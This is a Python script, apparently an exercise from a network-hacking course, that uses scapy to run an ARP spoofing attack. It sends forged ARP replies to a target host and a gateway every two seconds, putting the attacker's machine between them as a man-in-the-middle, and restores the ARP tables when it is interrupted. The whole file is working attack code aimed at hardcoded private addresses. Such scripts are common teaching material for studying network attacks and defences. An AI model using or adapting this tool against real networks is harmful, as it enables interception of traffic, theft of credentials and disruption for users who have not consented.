#!/usr/bin/env python
import sys
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Create spoofing ARP packet
    # packet = scapy.ARP(op=2, pdst="192.168.213.138", hwdst="00:0c:29:c8:ca:26", psrc="192.168.213.2")
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # scapy.ls(scapy.ARP())
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


sent_packets_count = 0

target_ip = "192.168.213.138"
gateway_ip = "192.168.213.2"

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # Dynamic printing
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
        # for Python3, you don't need the sys. Just use
        # print("\r[+] Packets sent: " + str(sent_packets_count), end="")

except KeyboardInterrupt:
    print("\n[+] Operation terminated by user.")
    print("\nResetting ARP tables...")
    # Restoring IP Tables
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\nARP tables reset was successful")
